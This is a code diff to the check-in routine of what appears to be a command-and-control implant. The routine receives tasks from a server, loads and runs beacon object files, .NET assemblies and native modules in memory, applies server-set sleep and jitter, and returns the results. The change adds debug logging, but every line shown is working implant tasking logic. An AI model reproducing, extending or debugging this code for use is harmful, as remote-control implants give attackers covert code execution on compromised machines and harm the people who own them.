@@ -461,23 +461,36 @@ BOOL agent_checkin(AgentState *state) {
     Task current_task;
     memset(&current_task, 0, sizeof(current_task));
     BOOL in_task = FALSE;
+    int task_count = 0;
+    int tlv_count = 0;
+
+    DBG("[checkin] parsing TLVs from body (%u bytes)", resp_body_len);
 
     while (tlv_iter(resp_body, resp_body_len, &offset, &entry)) {
+        tlv_count++;
+        DBG("[checkin] TLV #%d: type=0x%04X len=%u", tlv_count, entry.type, entry.length);
+
         switch (entry.type) {
             case TLV_TASK_ID:
                 /* If we were building a previous task, execute it first */
                 if (in_task) {
-                    /* Execute previous task */
+                    task_count++;
+                    DBG("[task] executing queued task #%d: type=0x%02X module='%s' args_len=%u",
+                        task_count, current_task.task_type, current_task.module_name,
+                        current_task.arguments_len);
+
                     unsigned char *result = NULL;
                     DWORD result_len = 0;
                     BOOL success = FALSE;
 
                     if (current_task.task_type == TASK_BOF) {
+                        DBG("[task] dispatching as BOF");
                         success = coff_load_and_execute(
                             current_task.payload, current_task.payload_len,
                             current_task.arguments, current_task.arguments_len,
                             &result, &result_len);
                     } else if (current_task.task_type == TASK_ASSEMBLY) {
+                        DBG("[task] dispatching as ASSEMBLY");
                         const char *asm_args = NULL;
                         if (current_task.arguments && current_task.arguments_len > 0) {
                             asm_args = (const char *)current_task.arguments;
@@ -486,14 +499,17 @@ BOOL agent_checkin(AgentState *state) {
                             current_task.payload, current_task.payload_len,
                             asm_args, &result, &result_len);
                     } else {
+                        DBG("[task] dispatching as NATIVE module '%s'", current_task.module_name);
                         success = module_execute(current_task.module_name,
                                                   current_task.arguments,
                                                   current_task.arguments_len,
                                                   &result, &result_len);
                     }
-                    /* Send result (with automatic chunking for large payloads) */
-                    send_task_result(state, current_task.task_id,
+                    DBG("[task] execution done: success=%d result_len=%u", success, result_len);
+
+                    BOOL send_ok = send_task_result(state, current_task.task_id,
                                     result, result_len, success);
+                    DBG("[task] send_task_result: %s", send_ok ? "OK" : "FAILED");
                     if (result) free(result);
                 }
 
@@ -505,25 +521,30 @@ BOOL agent_checkin(AgentState *state) {
                 break;
 
             case TLV_TASK_TYPE:
-                if (entry.length >= 1)
+                if (entry.length >= 1) {
                     current_task.task_type = entry.value[0];
+                    DBG("[checkin] task_type=0x%02X", current_task.task_type);
+                }
                 break;
 
             case TLV_MODULE_NAME:
                 if (entry.length > 0 && entry.length < sizeof(current_task.module_name)) {
                     memcpy(current_task.module_name, entry.value, entry.length);
                     current_task.module_name[entry.length] = '\0';
+                    DBG("[checkin] module_name='%s'", current_task.module_name);
                 }
                 break;
 
             case TLV_TASK_PAYLOAD:
                 current_task.payload = (unsigned char *)entry.value;
                 current_task.payload_len = entry.length;
+                DBG("[checkin] payload_len=%u", entry.length);
                 break;
 
             case TLV_TASK_ARGUMENTS:
                 current_task.arguments = (unsigned char *)entry.value;
                 current_task.arguments_len = entry.length;
+                DBG("[checkin] arguments_len=%u", entry.length);
                 break;
 
             case TLV_TASK_TIMEOUT:
@@ -537,20 +558,31 @@ BOOL agent_checkin(AgentState *state) {
             DWORD new_sleep;
             memcpy(&new_sleep, entry.value, 4);
             state->sleep_ms = (int)new_sleep;
+            DBG("[checkin] sleep updated to %u ms", new_sleep);
         }
         if (entry.type == TLV_CONFIG_JITTER && entry.length >= 1) {
             state->jitter_pct = entry.value[0];
+            DBG("[checkin] jitter updated to %u%%", entry.value[0]);
         }
     }
 
+    DBG("[checkin] TLV parsing done: %d TLVs, in_task=%d", tlv_count, in_task);
+
     /* Execute last task if any */
     if (in_task) {
+        task_count++;
+
         /* Check for EXIT task */
         if (current_task.task_type == TASK_EXIT) {
+            DBG("[task] EXIT task received — shutting down");
             state->running = FALSE;
             free(plaintext);
             return TRUE;
         }
+
+        DBG("[task] executing final task #%d: type=0x%02X module='%s' args_len=%u",
+            task_count, current_task.task_type, current_task.module_name,
+            current_task.arguments_len);
 
         if (current_task.task_type == TASK_NATIVE || current_task.task_type == TASK_BOF
             || current_task.task_type == TASK_ASSEMBLY) {
@@ -559,11 +591,13 @@ BOOL agent_checkin(AgentState *state) {
             BOOL success = FALSE;
 
             if (current_task.task_type == TASK_BOF) {
+                DBG("[task] dispatching as BOF");
                 success = coff_load_and_execute(
                     current_task.payload, current_task.payload_len,
                     current_task.arguments, current_task.arguments_len,
                     &result, &result_len);
             } else if (current_task.task_type == TASK_ASSEMBLY) {
+                DBG("[task] dispatching as ASSEMBLY");
                 const char *asm_args = NULL;
                 if (current_task.arguments && current_task.arguments_len > 0) {
                     asm_args = (const char *)current_task.arguments;
@@ -572,16 +606,21 @@ BOOL agent_checkin(AgentState *state) {
                     current_task.payload, current_task.payload_len,
                     asm_args, &result, &result_len);
             } else {
+                DBG("[task] dispatching as NATIVE module '%s'", current_task.module_name);
                 success = module_execute(current_task.module_name,
                                           current_task.arguments,
                                           current_task.arguments_len,
                                           &result, &result_len);
             }
 
-            /* Send result (with automatic chunking for large payloads) */
-            send_task_result(state, current_task.task_id,
+            DBG("[task] execution done: success=%d result_len=%u", success, result_len);
+
+            BOOL send_ok = send_task_result(state, current_task.task_id,
                             result, result_len, success);
+            DBG("[task] send_task_result: %s", send_ok ? "OK" : "FAILED");
             if (result) free(result);
+        } else {
+            DBG("[task] unknown task_type=0x%02X, skipping", current_task.task_type);
         }
     }
 
